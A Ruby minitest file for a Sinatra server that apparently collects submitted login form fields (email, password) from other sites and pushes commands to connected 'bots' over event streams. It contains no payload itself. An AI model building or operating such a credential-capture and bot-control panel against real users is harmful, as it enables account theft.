ENV['RACK_ENV'] = 'test'
require 'minitest/autorun'
require 'rack/test'

require_relative '../server.rb'

class RecordTest < MiniTest::Unit::TestCase

  def setup
  end

  def teardown
    Record.all.each do |record|
      record.destroy
    end
  end

  def test_record
    record = Record.record(JSON.parse('{"from_url":"https://example.com/","1.email":{"name":"login_email","value":"me@example.com"},"2.password":{"name":"login_password","value":"password"},"3.hidden":{"name":"login_submit","value":"1"},"4.checkbox":{"name":"remember_me","value":"on"},"5.submit":{"name":"login_submit_dummy","value":"Sign in"}}'),
      'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2',
      '0.0.0.0');
    assert_equal 1, Record.all.size
    assert_equal 'https://example.com/', record.from_url
    assert_equal '0.0.0.0', record.ip
    assert_equal 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2', record.user_agent
  end
end

class BotTest < MiniTest::Unit::TestCase

  def setup
    @connection = 'connection' # fake connection
    @ip = '127.0.0.1'
    @location = 'example.com'
    @bot = Bot.new(@connection, @ip, @location)
  end

  def teardown
  end

  def test_attr_readers
    assert_equal @connection, @bot.connection
    assert_equal @ip, @bot.ip
    assert_equal @location, @bot.location
  end
end

class ServerTest < MiniTest::Unit::TestCase

  include Rack::Test::Methods

  def app
    Sinatra::Application
  end

  def setup
    5.times do
      Record.record Hash.new
    end
  end

  def teardown
    Record.all.each do |record|
      record.destroy
    end
  end

  def not_authenticated
    assert last_response.client_error?
    assert_equal 401, last_response.status
  end

  def authenticate
    authorize 'littleming', 'littleming'
  end

  def test_get_root
    get '/'
    not_authenticated

    authenticate
    get '/'
    assert last_response.ok?
    assert last_response.body.include?('table')
  end

  def test_get_records
    get '/records'
    not_authenticated

    authenticate
    get '/records'
    assert last_response.ok?
    assert_equal 'application/json;charset=utf-8', last_response.headers['Content-Type']
    assert_equal 5, JSON.parse(last_response.body).size
  end

  def test_post_records
    post '/records', {}.to_json, 'CONTENT_TYPE' => 'application/json'
    assert last_response.ok?
  end

  def test_delete_records_id
    delete '/records/1'
    not_authenticated

    authenticate
    record = Record.first
    delete "/records/#{record.destroy; record.id}"
    assert last_response.ok?
    assert_equal 'does not exist', last_response.body

    authenticate
    delete "/records/#{Record.first.id}"
    assert last_response.ok?
    assert_equal 'deleted', last_response.body
  end

  def test_get_listen_records
    get '/listen/records'
    not_authenticated

    authenticate
    get '/listen/records', nil, 'HTTP_ACCEPT' => 'text/html'
    # should not respond to request whose accept header is not set to 'text/event-stream'
    assert_equal 404, last_response.status

    authenticate
    get '/listen/records', nil, 'HTTP_ACCEPT' => 'text/event-stream'
    assert last_response.ok?
    assert_equal 'text/event-stream;charset=utf-8', last_response.headers['Content-Type']
    assert_equal 'keep-alive', last_response.headers['Connection']
    assert_equal 'no-cache', last_response.headers['Cache-Control']
  end

  def test_get_bots
    get '/bots'
    not_authenticated

    authenticate
    get '/bots'
    assert last_response.ok?
    assert last_response.body.include?('table')
  end

  def test_post_bots_command
    post '/bots/command'
    not_authenticated

    authenticate
    post '/bots/command'
    assert last_response.ok?
  end

  def test_get_listen_commands
    get '/listen/commands', nil, 'HTTP_ACCEPT' => 'text/html'
    # should not respond to request whose header accept is not set to 'text/event-stream'
    assert_equal 404, last_response.status

    get '/listen/commands'
    assert last_response.ok?
    assert_equal 'text/event-stream;charset=utf-8', last_response.headers['Content-Type']
    assert_equal 'keep-alive', last_response.headers['Connection']
    assert_equal 'no-cache', last_response.headers['Cache-Control']
  end
end
